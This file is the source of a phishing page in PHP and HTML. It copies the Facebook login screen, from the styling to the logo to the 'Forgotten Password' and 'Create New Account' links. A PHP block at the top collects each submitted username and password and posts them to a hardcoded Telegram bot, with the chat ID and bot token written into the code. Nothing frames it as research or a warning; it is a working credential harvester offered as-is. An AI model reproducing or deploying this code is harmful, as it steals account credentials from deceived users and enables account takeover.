<?php
$chatID = "6315151980";
$token = "6978114331:AAHftB8usPpLKVTiF6JMccape6pEhV6MY1c";

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

$data = array(
    'chat_id' => $chatID,
    'text' => "\n\n\n[== Login Details ==]\n————————\nUsername: $username\nPassword: $password\n————————\n\nPremium : True\nApplication : Facebook\nUser   : Root\n\n\n\nCreated by bonjuu~\n https://facebook.com/login"
);

$url = "https://api.telegram.org/bot$token/sendMessage";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);
curl_close($ch);
?>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="https://i.ibb.co/8nS9V2wH/22.jpg">
    <meta name="title" content="Facebook">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <title>Facebook </title>
    <style>
        body {
            padding: 0;
            margin: 0;
            background-image: url("https://i.ibb.co/r2fVpX6X/1-ezgif-com-video-to-gif-converter.gif");
            background-color: #000;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: cover;
            background-position: center center;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .form-box {
            width: 90%;
            max-width: 400px; /* Set a max width for larger screens */
            padding: 20px;
            text-align: center;
            border-radius: 5px;
            background: rgba(255, 255, 255, 0.9); /* Slightly transparent background */
            box-shadow: 0px 2px 10px 1px rgba(71, 71, 71, 0.52);
        }
        .form-box input {
            width: 100%;
            margin-bottom: 15px;
            padding: 15px;
            font-size: 18px;
            box-sizing: border-box;
            border: 1px solid #eeebeb;
            border-radius: 5px;
            outline: none;
        }
        .form-box input:focus {
            box-shadow: 0px 0px 1px 1px rgb(22, 111, 229);
        }
        .form-box button {
            width: 100%;
            margin-bottom: 15px;
            color: #fff;
            font-size: 20px;
            font-weight: 600;
            border-radius: 5px;
            border: none;
            padding: 13px 0;
            cursor: pointer;
            background: #166fe5;
        }
        .form-box button:hover {
            background: #1877f2;
        }
        .form-box a {
            color: #166fe5;
            font-size: 14px;
            text-decoration: none;
            margin-top: 5px;
            margin-bottom: 20px;
            display: block;
        }
        .form-box a:hover {
            text-decoration: underline;
        }
        .form-box hr {
            border: 1px solid #dadde1;
            margin-bottom: 15px;
        }
        .form-box .create-btn a {
            color: #fff;
            font-size: 16px;
            text-decoration: none;
            padding: 15px 20px;
            border-radius: 5px;
            background: #36a420;
            font-weight: 600;
            display: inline-block;
            margin-bottom: 5px;
        }
        .form-box .create-btn a:hover {
            background: #42b72a;
        }
        img {
            width: 100%; /* Make images responsive */
            max-width: 235px; /* Set a max width for images */
        }
        @media (max-width: 600px) {
            .form-box {
                padding: 15px; /* Adjust padding on smaller screens */
            }
            .form-box input, .form-box button {
                font-size: 16px; /* Adjust font size for smaller screens */
            }
        }
    </style>
</head>
<body>
    <div class="form-box">
        <img src="https://i.ibb.co/0CvbLkT/IMG-20230723-231553-068.jpg" alt="Logo" style="display: none;">
        <img src="https://cdn.cdnlogo.com/logos/f/23/facebook.svg" alt="Facebook"><br><br>
        <form action="/" method="POST">
            <input name="username" type="text" placeholder="Enter Email or phone number" required>
            <input name="password" type="password" placeholder="Enter password" required>
            <button type="submit">Log in</button>
            <a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://m.facebook.com/r.php&ved=2ahUKEwio55nXuaSAAxUz2TgGHW__CQ8QFnoECAsQAQ&usg=AOvVaw1qd0DR1zJb5KBZq51JT8b9" target="_blank">Forgotten Password</a>
        </form>
        <hr>
        <div class="create-btn">
            <a href="https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://m.facebook.com/r.php&ved=2ahUKEwio55nXuaSAAxUz2TgGHW__CQ8QFnoECAsQAQ&usg=AOvVaw1qd0DR1zJb5KBZq51JT8b9" target="_blank">Create New Account</a>
        </div>
    </div>
    <script>
        // JavaScript function to handle redirection to YouTube
        function redirectToYouTube(event) {
            event.preventDefault(); // Prevents the default form submission
            window.location.href = 'https://www.youtube.com'; // Redirects to YouTube
        }
    </script>
</body>
</html>
